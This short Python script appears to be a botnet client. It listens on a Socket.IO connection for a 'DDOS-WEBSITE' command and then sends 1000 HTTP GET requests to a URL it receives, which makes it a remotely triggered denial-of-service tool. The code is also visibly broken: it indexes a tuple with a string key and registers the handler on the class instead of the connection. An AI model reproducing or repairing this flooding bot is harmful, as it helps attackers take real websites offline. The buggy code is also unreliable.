from socketIO_client import SocketIO, LoggingNamespace
import requests

def on_bbb_response(*args):
    print('on_bbb_response', args)

def ddoswebsite(*args):
    for x in range(0,1000):
        requests.get(args["url"])

with SocketIO('localhost', 3000, verify=False) as socketIO:
    SocketIO.on('DDOS-WEBSITE',ddoswebsite)